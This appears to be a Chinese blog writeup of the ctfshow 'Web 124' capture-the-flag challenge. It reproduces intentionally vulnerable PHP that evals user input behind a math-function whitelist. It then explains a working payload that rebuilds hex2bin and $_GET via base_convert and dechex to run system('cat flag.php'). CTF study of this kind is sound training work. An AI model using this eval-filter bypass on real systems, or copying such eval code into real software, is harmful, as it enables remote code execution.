---
layout: post
title: ctfshow writeup
category: web安全
date: 2023-8-17
---
远古笔记
<!-- more -->
[toc]

# WP

## WEB入门 124

> RCE、代码审计

打开这道题，源码已经给了出来，如下：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: 收集自网络
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-06 14:04:45

*/

error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

看一下代码，首先将GET方式得到的c计算长度，不能大于80，然后不能含有`\t \r \n ' " [ ] `，以及空格和反引号等字符。接下来是一个正则，前面部分匹配小写大写字母和下划线，后面匹配小写大写字母和数字和下划线，前面假如是数字开头，是不会被匹配的。刚开始以为这里有什么玄机，但并没有。

再者，注意一下`$content`这个变量，明显也是可以通过`;`来输入多条语句的。

然后说是只允许使用几个数学的函数，点上面的链接看这些函数，有几个比较重要：

> base_convert(source, input_base, out_base)

这里就是把`source`从`input_base`转换到`out_base`，且进制最大为36，返回值是字符串类型的，那这里就可控了。

在36进制下，任何一个小写字母都是存在的，因此我们可以通过`base_convert`将一个十进制字符串转化为一个任意的小写字符和数字的字符串。

> dechex(num)

这个不用说，把十进制数字转化为十六进制字符串，虽然`base_convert`是可以这样用，但是这里题目要求不能大于80，这个用法比较短呀，因此要构造的字符串中的字母在`a-f`之间都是可以用这个的。



有了上面两个函数，第一反应是直接构造一个system，但想了下这里没办法空格，自然没有办法直接`cat xxx`.因此这里就需要另一个函数`hex2bin($hex_str)`，可以将十六进制字符串按照Ascii码转化为任意字符串。这里这道题就快出来了，说一下payload，再说下payload含义。

payload:

```php
c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{1}($$pi{2});
&1=system
&2=cat flag.php
```

首先，因为有这么多限制，绕过起来太麻烦，而上面也说到可以传入多条命令，因此可以构造`$_GET`函数出来以得到各种可控变量。字符串`_GET`我们使用`hex2bin`可以构造出来。我们用`bin2hex('_GET')`可以得到字符串`_GET`对应的十六进制字符串`5f474554`。再用`hexdec('5f474554')`可以得到字符串`_GET`最终对应的十进制数是`1598506324`，那要恢复`_GET`这个字符串，我们倒过来，使用`hex2bin(dechex(1598506324))`，就可以了！

因此，构造`hex2bin`，即`base_convert(37907361743,10,36)`，然后里面是算出来的，不变，因此`_GET`就通过payload里面第一行构造出来了，我们将其赋值给变量`$pi`。原因是不能用别的字符，会被正则，这里用一个短一点的可用函数直接覆盖变量即可。然后使用`$$pi`，这样也就是函数`$_GET`，就可以得到任意字符的变量。

最后构造一个`system('cat flag.php')`即可。大概也只需要注意一下`$_GET`和`$_POST`是可以通过`{}`形式来传递参数的。